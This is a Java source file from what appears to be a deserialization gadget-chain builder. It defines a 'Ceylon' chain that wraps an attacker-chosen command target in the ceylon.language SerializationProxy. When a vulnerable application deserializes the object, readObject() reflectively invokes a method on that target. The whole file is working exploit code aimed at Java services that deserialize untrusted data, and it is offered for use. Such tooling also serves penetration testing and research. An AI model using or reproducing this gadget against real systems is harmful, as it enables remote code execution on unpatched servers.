package org.ses.gadgetbuilder.chains1;

import com.redhat.ceylon.compiler.java.language.SerializationProxy;
import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;

@Authors({ Authors.KULLRICH })
@Dependencies({ "org.ceylon-lang:ceylon.language:1.3.3" })
@Impact(Impact.MethodInvoke)
public class Ceylon extends MethodInvokeGadgetChain<NoTrampoline, MethodInvokeAdapter> {

    public Ceylon(MethodInvokeAdapter _adapter) {
        super(NoTrampoline.getInstance(), _adapter);
    }

    public Ceylon(NoTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        final Object payload = this.methodInvokeAdapter.getInvocationTarget(command);


        return new TrampolineConnector(
                new SerializationProxy(payload , payload.getClass(), this.methodInvokeAdapter.getMethodName()));
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "com.redhat.ceylon.compiler.java.language.SerializationProxy.readObject()\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
